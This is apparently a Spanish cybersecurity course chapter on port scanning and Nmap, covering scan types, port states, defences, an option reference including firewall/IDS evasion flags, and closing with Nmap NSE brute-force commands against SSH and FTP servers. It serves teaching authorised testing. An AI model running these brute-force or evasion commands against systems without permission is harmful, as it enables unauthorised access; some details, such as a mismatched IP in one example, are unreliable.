# 3. Reconocimiento y enumeraci√≥n

## **Uso de herramientas de escaneo de puertos y servicios.**

### **¬øQu√© es el escaneo de puertos?**

El escaneo de puertos es un proceso mediante el cual, a trav√©s de herramientas especializadas, se analizan los puertos de un sistema inform√°tico. Al escanear puertos se puede obtener informaci√≥n como los puertos que est√°n abiertos, los que est√°n cerrados o aquellos que est√°n protegidos con cortafuegos.

Este procedimiento se puede usar con distintas finalidades. Por ejemplo, los administradores de sistemas lo emplean para conocer los servicios que est√° ofreciendo la m√°quina o para analizar el estado de los puertos y detectar y subsanar posibles vulnerabilidades.

Sin embargo, como veremos m√°s adelante, el escaneo de puertos abiertos tambi√©n se puede usar con fines poco √©ticos. Del mismo modo que los administradores de redes lo pueden usar para detectar y corregir vulnerabilidades, los ciberdelincuentes lo pueden usar para explotar dichas brechas de seguridad.

## **T√©cnicas de escaneo de puertos**

A continuaci√≥n vemos las t√©cnicas m√°s habituales para realizar un scan de puertos.

- **TCP connect() scanning:** Es una de las t√©cnicas m√°s comunes para realizar escaneos TCP y cuenta con las ventajas de que es un m√©todo muy r√°pido y que apenas requiere privilegios. B√°sicamente, consiste en usar la llamada a sistema connect(). Si se logra establecer conexi√≥n, quiere decir que el puerto est√° abierto; si no se consigue conectar, significa que el puerto est√° cerrado.
- **TCP SYN scanning**: Este m√©todo se suele denominar ‚Äúhalf-open‚Äù o mitad abierta. En realidad, no se crea una conexi√≥n TCP completa. En lugar de eso, se env√≠an paquetes SYN como si se fuera a establecer una conexi√≥n. Si se recibe como respuesta un SYN-ACK es que el puerto est√° abierto, pero si se recibe un RST es que el puerto est√° cerrado. El principal inconveniente de este m√©todo es que se requieren privilegios de ROOT para poder llevarlo a cabo.
- **TCP FIN scanning:** Es una t√©cnica de escaneo de puertos que permite penetrar en sistemas en los que los firewalls o packet filters podr√≠an detectar el uso de paquetes SYN. Usando los paquetes SYN, puede pasar que la respuesta sea un RST si el puerto est√° cerrado, y que si est√° abierto el sistema no d√© una respuesta. Con los paquetes FIN esto no ocurre.
- **Fragmentation scanning:** No se trata de un m√©todo de escaneo de puertos propiamente dicho, sino que se basa en una modificaci√≥n de t√©cnicas anteriores. Consiste en dividir o fragmentar los paquetes SYN o FIN que se env√≠an, con el objetivo de que no sean detectados por los firewall o los filtradores de paquetes.
- **TCP reverse ident scanning:** Gracias al protocolo ‚Äúident‚Äù se puede conocer el nombre de usuario y el due√±o de los servicios que se est√°n usando dentro de una conexi√≥n TCP. Para ello es necesario establecer una conexi√≥n TCP completa.
- **UDP ICMP port unreachable scanning:** Es una t√©cnica que se diferencia de las anteriores en que no se basa en el protocolo TCP, sino que usa el UDP. Este protocolo, aunque suele ser m√°s sencillo, resulta m√°s complejo a la hora de escanear puertos, por lo que el proceso se puede volver significativamente m√°s lento.

## **¬øEscanear puertos es siempre legal?**

No, el escaneo de puertos no siempre es legal. El port scanning se puede utilizar para fines leg√≠timos. Por ejemplo, para que los administradores de redes y sistemas comprueben el estado de los puertos, las conexiones y los programas o aplicaciones que est√° ofreciendo el equipo. Tambi√©n se puede usar como un m√©todo para el an√°lisis de vulnerabilidades y brechas de seguridad. Los administradores pueden escanear los puertos para crear un mapa de las conexiones y detectar posibles fallos o vulnerabilidades. Por ello, se puede decir que el escaneo de puertos es totalmente legal, siempre y cuando se tenga permiso para acceder al equipo y se realice con fines leg√≠timos.

Sin embargo, tambi√©n puede ser usado con objetivos poco √©ticos. Muchos atacantes emplean este tipo de t√©cnicas para aprovecharse de esos fallos de seguridad. Al final, los puertos abiertos pueden funcionar como una puerta de entrada a un equipo, para luego realizar otras actividades maliciosas, como ataques de denegaci√≥n de servicio.

## **Ataques de escaneo de puertos. Qu√© son y c√≥mo evitarlos**

Al hilo del punto anterior, cabe decir que los ataques de escaneo de puertos son uno de los m√©todos m√°s empleados por los crackers para descubrir vulnerabilidades en un sistema. De hecho, lo primero que har√° un cibercriminal antes de lanzar su ataque ser√° un portscan, lo que le permitir√° saber informaci√≥n como la arquitectura de la red, los servicios que ofrecemos en nuestros equipos y, por supuesto, buscar agujeros o brechas de seguridad en los mismos. Dicho de otro modo, cada puerto abierto es una potencial puerta de entrada al equipo, por lo que es necesario tomar ciertas medidas de seguridad.

Una de ellas es no abrir m√°s puertos de los necesarios, Normalmente, los equipos ya vienen con una serie de puertos abiertos predeterminados para poder ofrecer los servicios y funciones b√°sicas. Tambi√©n es aconsejable el uso de firewall o filtradores de paquetes, los cu√°les funcionan como una barrera que protege al equipo de intrusos. Otra recomendaci√≥n es mantener siempre los equipos y sistemas actualizados a su √∫ltima versi√≥n, ya que los desarrolladores suelen crear parches que subsanan posibles vulnerabilidades.

Por √∫ltimo, est√° la opci√≥n de usar herramientas como PortScanDetector, que permite detectar cu√°ndo se est√° realizando un rastreo de nuestros puertos. B√°sicamente, avisa a los administradores en aquellos casos en los que han sido consultados m√°s de 10 puertos, lo cual puede indicar que un hacker est√° intentando acceder al equipo.

El escaneo de puertos y servicios es una pr√°ctica com√∫n en pruebas de penetraci√≥n y evaluaciones de seguridad para identificar servicios activos, puertos abiertos y posibles vulnerabilidades en un sistema. Aqu√≠ hay pasos generales y algunas herramientas comunes utilizadas para realizar este tipo de escaneo:

## **Pasos Generales:**

- Definir el Alcance: Establecer el alcance de la prueba, identificando los sistemas o redes espec√≠ficas a escanear y obteniendo el consentimiento del propietario.
- Seleccionar Herramientas Apropiadas: Elegir herramientas de escaneo de puertos y servicios que se ajusten a los requisitos del proyecto y al entorno que se va a evaluar.
- Configurar Par√°metros: Configurar los par√°metros de la herramienta de escaneo, como rango de direcciones IP, rango de puertos y opciones de escaneo espec√≠ficas.
- Realizar el Escaneo: Ejecutar la herramienta de escaneo para identificar los puertos abiertos y los servicios en los sistemas objetivo.
- Analizar Resultados: Revisar los resultados del escaneo para identificar servicios, versiones de software y posibles vulnerabilidades asociadas a los puertos encontrados.
- Registrar y Documentar: Mantener registros detallados de los resultados del escaneo, incluyendo los servicios identificados, versiones y cualquier hallazgo relevante.

## **Herramientas Comunes de Escaneo de Puertos y Servicios:**

**Nmap**: Herramienta vers√°til de escaneo de puertos y mapeo de redes.

> Ejemplo de Uso: nmap -p 1-1000 192.168.1.1

**Masscan**: Esc√°ner de puertos de alto rendimiento.

> Ejemplo de Uso: masscan -p1-65535 192.168.1.1

**Unicornscan:** Herramienta de escaneo de red y puertos con enfoque en velocidad y eficiencia.

> Ejemplo de Uso: unicornscan -mU -Iv 192.168.1.1:a

**Hping3**: Herramienta avanzada de env√≠o de paquetes, √∫til para escaneo de puertos.

> Ejemplo de Uso: hping3 -S -p 80 192.168.1.1

**Netcat (nc)**: Herramienta de utilidad de red que puede utilizarse para escanear puertos.

> Ejemplo de Uso: nc -zv 192.168.1.1 1-100

Es fundamental recordar que el escaneo de puertos y servicios debe llevarse a cabo de manera √©tica y legal, con el consentimiento expl√≠cito del propietario del sistema o la red objetivo.

## **Reconocimiento y enumeraci√≥n con Nmap**

[Nmap](https://nmap.org/) es una utilidad completamente gratuita y de c√≥digo abierto, nos permite descubrir redes y host, as√≠ como realizar auditor√≠a de seguridad. Este programa es compatible con sistemas operativos Linux, Windows y tambi√©n macOS, pero en todos ellos se utiliza a trav√©s de la l√≠nea de comandos, aunque tenemos la posibilidad de instalar ZenMap que es la utilidad gr√°fica de Nmap para hacer los escaneos de puertos a trav√©s de la interfaz gr√°fica de usuario. Si no quieres pelearte con comandos a trav√©s de consola, esta interfaz gr√°fica de usuario te podr√≠a ser √∫til para los primeros pasos con este gran programa, no obstante, cuando tengas m√°s experiencia seguramente ejecutes todas las √≥rdenes directamente desde terminal.

Nmap nos permite detectar hosts de una red local, y tambi√©n a trav√©s de Internet, de esta forma, podremos saber si dichos hosts (ordenadores, servidores, routers, switches, dispositivos IoT) est√°n actualmente conectados a Internet o a la red local. Esta herramienta tambi√©n permite realizar un escaneo de puertos a los diferentes hosts, ver qu√© servicios tenemos activos en dichos hosts gracias a que nos dir√° el estado de sus puertos, podremos saber qu√© sistema operativo est√° utilizando un determinado equipo, e incluso podremos automatizar diferentes pruebas de pentesting para comprobar la seguridad de los equipos.

Nmap tiene diferentes tipos de escaneo de puertos, pueden ser a trav√©s de segmentos TCP, datagramas UDP o paquetes ICMP, adem√°s, permite realizar escaneos de forma oculta para que sean dif√≠ciles de detectar por los firewalls. Por supuesto, podremos hacer escaneo de puertos sobre ciertos puertos en concreto, entre rangos de puertos, rangos de direcciones IP, posibilidad de usar paquetes TCP null, FIN, Xmas y ACK adem√°s de SYN, para localizar los puertos TCP abiertos.

Otras caracter√≠sticas que nos brinda esta herramienta, es la posibilidad de hacer un completo inventario de red, e incluso comprobar si un determinado host o servicio sigue levantado y funcionando. Este programa fue dise√±ado para escanear una gran cantidad de hosts, por tanto, si necesitas escanear m√∫ltiples objetivos no tendr√°s problemas. Este programe es muy flexible, incorpora decenas de t√©cnicas avanzadas para escanear hosts y puertos, adem√°s, tambi√©n permite realizar auditor√≠as a trav√©s de NSE (Nmap Search Engine), por lo que es realmente potente.

<aside>
üëâ Nmap tiene varios estados en los puertos que aparecer√°n cuando hagamos un escaneo de puertos. Es fundamental saber qu√© significa cada estado de Nmap, porque con cualquier escaneo de puertos, nos devolver√° diferentes estados.

</aside>

## **Principales usos de Nmap**

Como has podido ver, Nmap es una herramienta muy vers√°til. Esta se puede utilizar para gran variedad de tareas, sobre todo relacionadas con la seguridad de la informaci√≥n. Pero tambi√©n nos permite realizar administraci√≥n de redes. Algunos de los usos m√°s comunes para Nmap son:

- **Escaneo de puertos:** Se puede utilizar para realizar el escaneo de puertos abiertos en la red. Lo cual nos da la posibilidad de identificar posibles puntos en los que un atacante puede atacar nuestra red. Tambi√©n se pueden realizar escaneos de puertos espec√≠ficos, o un rango de puertos. Lo cual nos dice los que est√°n abiertos, y como tal, con posibilidad de ser atacados.
- **Detecci√≥n de sistemas:** Nmap se puede utilizar para encontrar sistemas activos en una red. Esto puede incluir servidores y dispositivos de red. Esto se hace escaneando una direcci√≥n IP, o un rango de direcciones para identificar los dispositivos en la red.
- **Detecci√≥n de servicios:** Con Nmap es posible detectar los servicios que se est√°n ejecutando en la red, lo cual nos ayuda en muchos casos a detectar vulnerabilidades. Podremos identificar servicios como HTTP, Telnet, FTP, SSH, entre otros muchos. Esto lo que permite es proporcionar informaci√≥n muy detallada sobre los softwares que est√°n siendo ejecutados, incluso las versiones de los mismos.
- **Mapeo de redes:** Se puede utilizar para mapear redes. Esto puede incluir varios factores como la ubicaci√≥n de un dispositivo o la topolog√≠a de la propia red. As√≠ ser√° mucho m√°s sencillo crear un mapa visual de toda la infraestructura, identificando los dispositivos y como est√°n conectados.
- **Pruebas de seguridad:** Con Nmap se pueden realizar pruebas de penetraci√≥n y evaluaciones de seguridad. Esto nos permite identificar vulnerabilidades en los sistemas o la red. Esto est√° directamente ligado al escaneo de puertos.
- **Monitorizaci√≥n:** Nmap tiene la capacidad de realizar una monitorizaci√≥n de la disponibilidad de los servidores o dispositivos de la red. Lo cual nos ayuda a ver si est√°n funcionando de la forma correcta.

## **Para que escanear puertos**

Como hemos visto, con nmap tenemos una herramienta especializada en analizar los puertos de los sistemas inform√°ticos, obteniendo informaci√≥n sobre si est√°n abiertos, cerrados o protegidos con cortafuegos. Esto se puede hacer con multitud de finalidades, como saber qu√© servicios se est√°n ofreciendo desde un equipo por los administradores o por seguridad, buscando solventar alg√∫n problema que pueda llegar en forma de vulnerabilidad.

Pero esto tambi√©n se puede utilizar con fines maliciosos. Igual que los Administradores pueden analizarlos para buscar posibles vulnerabilidades, un atacante puede hacerlo por exactamente lo mismo, pero con la intenci√≥n de aprovecharse de ello para infiltrarse en la red aprovechando una brecha en la seguridad.

## **Estado de los puertos con Nmap**

- **Open**: una aplicaci√≥n est√° activamente aceptando conexiones TCP o UDP. El puerto est√° abierto y se puede utilizar, los pentesters podr√°n utilizar este puerto abierto para explotar el sistema. Es el estado por defecto si no tenemos ning√∫n firewall bloqueando accesos.
- **Closed**: un puerto que est√° cerrado es accesible porque responde a Nmap, sin embargo, no hay ninguna aplicaci√≥n funcionando en dicho puerto. Es √∫til para descubrir que un host est√° levantado, o como parte de la detecci√≥n de un sistema operativo. De cara al administrador del sistema, es recomendable filtrar estos puertos con el firewall para que no sean accesibles. De cara al pentester, es recomendable dejar estos puertos ‚Äúcerrados‚Äù para analizar m√°s tarde, por si ponen alg√∫n servicio nuevo.
- **Filtered**: en este estado Nmap no puede determinar si el puerto est√° abierto, porque hay un firewall filtrando los paquetes de Nmap en dicho puerto. Estos puertos filtrados son los que aparecer√°n cuando tengamos un firewall activado. Nmap intentar√° en varias ocasiones intentar conectar, lo que hace que el escaneo de puertos sea bastante lento.
- **Open/Filtered**: Nmap no sabe si el puerto est√° abierto o filtrado. Esto ocurre porque el puerto abierto no env√≠a ninguna respuesta, y dicha falta de respuesta podr√≠a ser por el firewall. Este estado aparece cuando usamos UDP y IP, y utilizamos escaneos FIN, NULL y Xmas.
- **Closed/Filtered**: en este estado no se sabe si el puerto est√° cerrado o filtrado. Solo se usa este estado en el IP Idle Scan.

# **Efectividad de Nmap**

Nmap es una herramienta que se considera altamente efectiva. Esto se debe a una combinaci√≥n de funcionalidad y caracter√≠sticas avanzadas, que hace de esta soluci√≥n una de las mejores que podemos encontrarnos. Esta cuenta con la capacidad de realizar escaneos de vulnerabilidades, para identificar posibles debilidades en las configuraciones de los sistemas de seguridad. Por lo cual, de no ser efectiva, no ser√≠a una herramienta tan conocida. Por lo cual podr√≠amos decir, que la propia fama de Nmap es un buen identificativo para la calidad que puede proporcionarnos en una gran variedad de situaciones diferentes.

Por otro lado, m√°s all√° de su eficacia en identificaci√≥n de dispositivos, servicios y vulnerabilidades, est√° su capacidad para trabajar con diferentes protocolos de red. Entre otros, TCP, UDP, ICMP e IP. Todo lo cual, se puede integrar con otras herramientas de seguridad y an√°lisis. Pueden ser herramientas como Metasploit o incluso Wireshark. Lo cual hace de Nmap una herramienta muy vers√°til para todo tipo de sistemas.

En cambio, no estamos ante una soluci√≥n que sea perfecta, ni que represente una medida de seguridad ante problemas. A pesar de que es muy efectiva y poderosa, requiere de cierto conocimiento por parte de los usuarios que la utilicen. As√≠ como la disposici√≥n de las habilidades necesarias para darle uso con todas las garant√≠as, y aprovechando su rendimiento y funciones al m√°ximo. Tambi√©n debemos pensar que muchos dispositivos pueden contar con alg√∫n tipo de protecci√≥n contra los escaneos de las aplicaciones como Nmap, o pueden incluso ser complicados de detectar. Pero en estos casos, ya no ser√≠a un problema de la eficiencia de Nmap ni de sus funciones, sino de las medidas de protecci√≥n establecidas en esos dispositivos. En todo caso, si buscamos una soluci√≥n efectiva, fiable y con buena trayectoria, Nmap es una de las mejores soluciones actualmente.

## **Personalizaci√≥n de NMAP**

Como puedes ver, con NMAP estamos ante una herramienta de c√≥digo abierto, por lo cual tiene una alta capacidad de personalizaci√≥n. Lo cual la lleva a ser una soluci√≥n altamente adaptable a las necesidades de cada usuario, en todo tipo de escenarios. Pero esto es algo que no se realiza a la ligera, sino que hay algunos factores que destacan por encima de otros. Empezando por las opciones de escaneo, donde la gama de opciones es muy amplia. Esta permite gestionar muchos par√°metros y opciones avanzadas, que modifican por completo el funcionamiento de NMAP. El escaneo personalizado, permite disponer de informaci√≥n muy valiosa, y de todo tipo al realizar an√°lisis de puertos, por ejemplo.

Por otro lado, est√°n los scripts NSE (Nmap Scripting Engine). Esta es una de las caracter√≠sticas m√°s potentes de NMAP, la cual permite ejecutar scripts muy personalizados durante el tiempo de escaneo. Al poder crear los scripts por nuestra parte, pueden ser todo lo complejos que sea necesario. Y como tal nos da ese a√±adido en personalizaci√≥n, el cual no tendr√≠amos sin esta secci√≥n de NMAP. Todo se hace buscando la salida personalizada de datos, donde se pueden establecer muchos par√°metros. Desde el formato de salida, generar informes HTML, y los resultados que vamos a necesitar que incluya el an√°lisis que se realiza en la red.

Por √∫ltimo, NMAP cuenta con una gran capacidad de integraci√≥n con otras herramientas. Una de las caracter√≠sticas m√°s llamativas, es el poder establecer NMAP como entrada para otras herramientas de seguridad que utilicemos, o incluso para detecci√≥n de intrusos. Lo cual, de nuevo, se puede combinar con los scripts que mencionamos previamente. Una vez que hemos visto las principales caracter√≠sticas de Nmap, y el estado de los puertos que tenemos disponibles, vamos a instalarlo y utilizarlo.

## **Descarga e instalaci√≥n de Nmap en cualquier sistema**

Lo primero que tenemos que hacer para utilizar este programa tan potente, es descargarlo y posteriormente instalarlo. En la **[secci√≥n de descargas de Nmap](https://nmap.org/download.html)** pod√©s encontrar todos los enlaces, binarios y c√≥digo fuente para su instalaci√≥n en sistemas operativos Windows, Linux y MacOS. Este programa, actualmente lo tenemos disponible en todos los repositorios de los sistemas operativos basados en Linux, por lo que su instalaci√≥n es realmente sencilla. En Kali Linux ya viene instalado, pero si en tu Linux no esta instalado simplemente ejecutando la orden de instalaci√≥n seguido de ¬´nmap¬ª, instalaras el programa sin dificultades.

`sudo apt install nmap`

## **Ejemplos de uso de Nmap**

Nmap es un programa muy avanzado y complejo, con decenas de comandos y ataques que vamos a poder realizar, con el objetivo de descubrir todos los hosts que tengamos en una red local dom√©stica o profesional, adem√°s, tambi√©n es capaz de detectar hosts en Internet, es decir, vamos a poder escanear uno a uno cualquier direcci√≥n IP de Internet e incluso subredes que sean p√∫blicas.

Una vez que hemos descubierto que el host est√° online, se le puede realizar un escaneo r√°pido de puertos y comprobar si tiene un firewall filtrando todos los paquetes, o bien tenemos un puerto abierto para poder explotar alguna vulnerabilidad. Nmap permite utilizar tanto direcciones IPv4 privadas y p√∫blicas, como tambi√©n direcciones IPv6, con el objetivo de poder escanear los puertos de cualquier host.

A continuaci√≥n, veremos algunos ejemplos de c√≥mo se utiliza Nmap a nivel usuario, y tambi√©n con comandos algo m√°s avanzados, y es que este programa nos permitir√° descubrir con cierta exactitud qu√© sistema operativo est√° utilizando el host remoto, ideal para obtener la m√°xima informaci√≥n posible.

## **Escaneo r√°pido de puertos**

Si quieres realizar un escaneo r√°pido de puertos a un determinado host, debemos teclear el siguiente comando. Este comando b√°sico se encargar√° de escanear los principales puertos a la direcci√≥n IP privada o p√∫blica definida, un detalle muy importante es que no escanear√° todos los puertos, sino los m√°s utilizados habitualmente.

> nmap [ip]

Por ejemplo, si queremos realizar un escaneo r√°pido de los principales puertos a un host con direcci√≥n IP 192.168.1.1, la orden ser√≠a la siguiente:

> nmap 192.168.1.1

El programa nos devolver√° los puertos que se encuentran abiertos en el equipo objetivo.

![Nmap escaneo](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nmap-escaneo.png?raw=true)

En el caso de querer escanear todos y cada uno de los puertos tendremos que recurrir al siguiente comando y poner un rango desde el puerto 1 hasta el 65535, de esta forma estaremos comprobando si todos y cada uno de los puertos est√°n abiertos, cerrados o filtrados.

## **Realizar escaneo de un rango de puertos**

En lugar de realizar un escaneo de todos los puertos, podemos establecer un rango de puertos a comprobar. Para ello ejecutaremos:

> nmap -p [rango] [ip]

Si queremos realizar un escaneo de puertos desde el 20 TCP hasta el 200 TCP en la direcci√≥n IP 192.168.1.1, basta con ejecutar la siguiente orden:

> nmap -p 20-200 192.168.1.1
> 

El programa nos indicar√° dentro de ese rango qu√© puertos est√°n abiertos.

![Rango cuerpos](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/rango-cuerpos.png?raw=true)

Dependiendo de la latencia de la conexi√≥n entre nuestro equipo y el host remoto, y tambi√©n el n√∫mero de puertos a analizar, este proceso podr√≠a durar desde varios segundos hasta unos 10 minutos aproximadamente.

## **Detectar el sistema operativo y m√°s datos del host**

Podemos indicar a Nmap que detecte el sistema operativo. Esto lo realiza enviando paquetes y analizando la forma en que los devuelve, siendo en cada sistema totalmente diferente. Junto a esto, realizar√° una exploraci√≥n de puertos y de los servicios en busca de vulnerabilidades. Asimismo, el escaneo devolver√° informaci√≥n √∫til. Para ello debemos ejecutar:

> nmap -A -v [ip]

Si queremos realizar este escaneo a la direcci√≥n IP 192.168.1.1 podemos ejecutar la siguiente orden:

> nmap -A -v 192.168.1.1

Esta prueba de detecci√≥n del sistema operativo no es del todo fiable porque depende de muchos par√°metros, en algunos casos la exactitud es muy buena, sobre todo en diferenciar si es Windows o Linux, pero dentro del mundo Linux es realmente complicado conocer qu√© sistema operativo es en concreto.

![usuario operativo](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/usuario-operativo.png?raw=true)

# **Listado de todos los comandos**

Este programa es realmente completo, hasta el momento hemos utilizado los comandos b√°sicos para descubrir hosts y tambi√©n para ver si tiene los puertos abiertos, sin embargo, esto no se queda as√≠, y tenemos un gran listado de comandos para exprimir al m√°ximo esta herramienta.

### **Seleccionar objetivos**

Direcciones o rangos IP, nombres de sistemas, redes, etc.

- **Ejemplo:** scanme.nmap.org, microsoft.com/24, 192.168.0.1, 10.0.0-255.1-254
- **iL** fichero lista en fichero -iR n elegir objetivos aleatoriamente, 0 nunca acaba
- **‚Äìexclude ‚Äìexcludefile** fichero excluir sistemas desde fichero

### **Descubrir sistemas**

- **PS** n tcp syn ping
- **PA** n ping TCP ACK
- **PU** n ping UDP
- **PM** Netmask Req
- **PP** Timestamp Req
- **PE** Echo Req
- **sL** an√°lisis de listado
- **PO** ping por protocolo
- **PN** No hacer ping
- **n** no hacer DNS
- **R** Resolver DNS en todos los sistemas objetivo
- **‚Äìtraceroute**: trazar ruta al sistema (para topolog√≠as de red)
- **sP** realizar ping, igual que con ‚ÄìPP ‚ÄìPM ‚ÄìPS443 ‚ÄìPA80

## **T√©cnicas de an√°lisis de puertos**

En la mayor√≠a de ocasiones, cuando los usuarios est√°n empezando a utilizar esta herramienta, lo m√°s probable es que intenten la resoluci√≥n de la mayor√≠a de problemas con el tipo de escaneo SYN porque es uno de los m√°s vers√°tiles. Pero, a medida que avanzan y conocen la herramienta en profundidad, se dar√°n cuenta de que ampliar√°n su abanico de soluciones y aqu√≠ abajo explicamos un poco algunos de los comandos que resultan m√°s √∫tiles al momento de analizar puertos.

- **sS an√°lisis utilizando TCP SYN:** Este tipo de escaneo, est√° basado en la velocidad de escaneo, de ah√≠ la versatilidad que mencionamos anteriormente, ya que permite escanear miles de puertos por segundo en una red que se encuentre desprotegida o carezca de un firewall. Adem√°s, en lo que a t√©rminos de privacidad se refiere, es una excelente t√©cnica, ya que no llega a completar las conexiones TCP y por lo tanto no llama la atenci√≥n.
- **sT an√°lisis utilizando TCP CONNECT:** Este tipo de exploraci√≥n, podr√≠amos decir que es la que se utiliza principalmente, sobre todo cuando no podemos ejecutar un escaneo tipo SYN, este tipo de an√°lisis de conexi√≥n, lo que hace es realizar o emitir una llamada al sistema de conexi√≥n para que se establezca una conexi√≥n con la red que estamos analizando. Luego, Nmap lo que hace es utilizar esta llamada para analizar la informaci√≥n sobre cada intento de conexi√≥n, la principal desventaja de este tipo de an√°lisis es que nos toma un poco m√°s de tiempo identificar los puertos que est√°n abiertos que nos llevar√≠a por ejemplo con el SYN.
- **sU an√°lisis utilizando UDP:** Este tipo de escaneo es bastante simple, suele utilizarse sobre todo cuando queremos realizar un seguimiento de puertos como los DNS, SNMP y DHCP en nuestra red. Por supuesto, que sea sencillo no quita que son puertos bastante importantes, ya que suelen ser las √°reas por donde suelen haber atacantes buscando vulnerabilidades para explotar.
- **sY** an√°lisis utilizando SCTP INIT
- **sZ** utilizando COOKIE ECHO de SCTP
- **sO** protocolo IP
- **sW** ventana TCP -sN
- **‚ÄìsF -sX** NULL, FIN, XMAS
- **‚ÄìsA** TCP ACK

### **Puertos a analizar y orden de an√°lisis**

- **p n-m** rango
- **p‚Äì** todos los puertos
- **p n,m,z** especificados
- **p U:n-m,z T:n,m** U para UDP, T para TCP
- **F** r√°pido, los 100 comunes
- **‚Äìtop-ports n** analizar los puertos m√°s utilizados
- **r** no aleatorio

### **Duraci√≥n y ejecuci√≥n:**

- **T0** paranoico
- **T1** sigiloso
- **T2** sofisticado
- **T3** normal
- **T4** agresivo
- **T5** locura
- **‚Äìmin-hostgroup**
- **‚Äìmax-hostgroup**
- **‚Äìmin-rate**
- **‚Äìmax-rate**
- **‚Äìmin-parallelism**
- **‚Äìmax-parallelism**
- **‚Äìmin-rtt-timeout**
- **‚Äìmax-rtt-timeout**
- **‚Äìinitial-rtt-timeout**
- **‚Äìmax-retries**
- **‚Äìhost-timeout ‚Äìscan-delay**

**Detecci√≥n de servicios y versiones:**

- **sV:** detecci√≥n de la versi√≥n de servicios
- **‚Äìall-ports** no excluir puertos
- **‚Äìversion-al**l probar cada exploraci√≥n
- **‚Äìversion**trace rastrear la actividad del an√°lisis de versi√≥n
- **O** activar detecci√≥n del S. Operativo
- **‚Äìfuzzy** adivinar detecci√≥n del SO
- **‚Äìmax-os-tries** establecer n√∫mero m√°ximo de intentos contra el sistema objetivo

**Evasi√≥n de Firewalls/IDS**

- f fragmentar paquetes
- **D d1,d2** encubrir an√°lisis con se√±uelos
- **S ip** falsear direcci√≥n origen
- **‚Äìg source** falsear puerto origen
- **‚Äìrandomize-hosts** orden
- **‚Äìspoof-mac mac** cambiar MAC de origen

**Par√°metros de nivel de detalle y depuraci√≥n**

- **v** Incrementar el nivel de detalle
- **‚Äìreason** motivos por sistema y puerto
- **d (1-9)** establecer nivel de depuraci√≥n
- **‚Äìpacket-trace** ruta de paquetes

**Otras opciones**

- **‚Äìresume file** continuar an√°lisis abortado (tomando formatos de salida con -oN o -oG)
- **6** activar an√°lisis IPV6
- **A** agresivo, igual que con -O -sV -sC ‚Äìtraceroute

**Opciones interactivas**

- **v/V** aumentar/disminuir nivel de detalle del an√°lisis
- **d/D** aumentar/disminuir nivel de depuraci√≥n
- **p/P** activar/desactivar traza de paquetes

**Scripts**

- **sC** realizar an√°lisis con los scripts por defecto
- **‚Äìscript file** ejecutar script (o todos)
- **‚Äìscript-args n=v** proporcionar argumentos
- **‚Äìscript-trace** mostrar comunicaci√≥n entrante y saliente

**Formatos de salida**

- **oN** guardar en formato normal
- **oX** guardar en formato XML
- **oG** guardar en formato para posteriormente usar Grep
- **oA** guardar en todos los formatos anteriores

<aside>
üí° Principalmente estos son los comandos de que dispone Nmap. Antes de terminar, debemos decir que Nmap dispone de multitud de opciones con las que poder realizar completos an√°lisis de redes. Podemos consultar todas las opciones disponibles tecleando:
</aside>

> nmap --help

![nmap help](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nmap-help.png?raw=true)

Nmap es sin duda una herramienta muy sencilla y completa para realizar auditor√≠as de redes, pero esto no acaba aqu√≠, tambi√©n tenemos disponible Nmap NSE para realizar pentesting avanzados.

**Otras t√©cnicas de escaneo**

Como hemos visto, nmap ofrece muchos par√°metros para realizar un escaneo m√°s a medida, pero actualmente existen otros m√©todos para realizar esta tarea los cuales pueden ser interesantes. Cada uno de ellos tiene sus propias caracter√≠sticas, y pueden variar en efectividad.

- **TCP connect()scanning:** Es una de la formas de escaneo m√°s comunes, porque es r√°pido y no son necesarios demasiados privilegios en el equipo.
- **TCP SYN scanning:** Tambi√©n conocido como ¬´half-open¬ª. Este no llega a crear una conexi√≥n TCP, si no que utiliza el env√≠o de paquetes SYN. Puede obtener dos respuestas diferentes, un SYN-ACK que indica que el puerto est√° abierto, y un RST que est√° cerrado.
- **TCP FIN scanning:** Permite realizar escaneos de puertos en aquellos sistemas que cuentan con firewalls o filtros de paquetes SYN.
- **Fragmentation Scanning:** Aqu√≠ no estamos ante un escaneo como tal, sino que est√° para modificar las t√©cnicas anteriores mediante la divisi√≥n o fragmentaci√≥n de paquetes SYN o FIN. Esto se hace para que no sean detectados por firewall o filtros de paquetes.
- **TCP reverse ident scanning:** Con este identificador, es posible conocer datos sobre el responsable de los servicios que est√°n usando una determinada conexi√≥n TCP. Requiere una conexi√≥n completa.

> Gracias a estas t√©cnicas de escaneo avanzadas, pordemos determinar si los puertos est√°n abiertos o cerrados.

# **Nmap NSE: qu√© es y para qu√© sirve**

**Nmap Search Engine** o tambi√©n conocido como **Nmap NSE**, es una gran base de datos con miles de scripts que nos permitir√° automatizar la realizaci√≥n de pentesting a sistemas y redes. El primer paso de cualquier pentesting es realizar un escaneo de puertos, una vez realizado este escaneo de puertos, podremos intentar explotar vulnerabilidades en los servicios que hay funcionando detr√°s de un determinado puerto, por ejemplo, podr√≠amos atacar servidores web, servidores Samba, FTP, servidores SSH, servidores DNS, comprobar si los diferentes servicios tienen vulnerabilidades conocidas o directamente intentar autenticarnos en ellos, si es que tienen autenticaci√≥n como en el FTP o SSH.

NMAP NSE es un conjunto de scripts que nos permitir√° automatizar muchas acciones, como realizar ataques de fuerza bruta a servidores Samba, con el objetivo de intentar acceder a ellos y hacernos con el control, aunque tambi√©n podr√≠amos atacarlo para realizarle un ataque de denegaci√≥n de servicio y que el servicio no est√© disponible. Lo mismo podr√≠amos hacer con los servidores FTP, servidores SSH y mucho m√°s, sobre todo, los servidores web que deben tener un puerto abierto en el firewall son los que m√°s se deben proteger para evitar o mitigar los ataques que nos puedan realizar.

Por ejemplo, si queremos realizar un ataque de fuerza bruta, basado en un listado de usuarios (con un archivo que se llame usuarios.txt) y con un listado de contrase√±as a probar (con un archivo que se llame claves.txt) a un servidor SSH de un determinado equipo que tiene la IP 192.168.25.01, podemos poner el siguiente comando:

> nmap -p 22 --script ssh-brute --script-args userdb=usarios.txt,passdb=claves.txt --script-args ssh-brute.timeout=4s 192.168.25.01

Si queremos saber si un servidor FTP tiene habilitado la autenticaci√≥n an√≥nima, podremos hacerlo f√°cilmente poniendo la siguiente orden:

> nmap -sV -sC -p21 192.168.25.01

si queremos realizar un ataque de fuerza bruta a un servidor FTP a un servidor con la IP 99.99.99.99, podemos poner el siguiente comando:

> nmap -p 21 --script ftp-brute 192.168.25.01

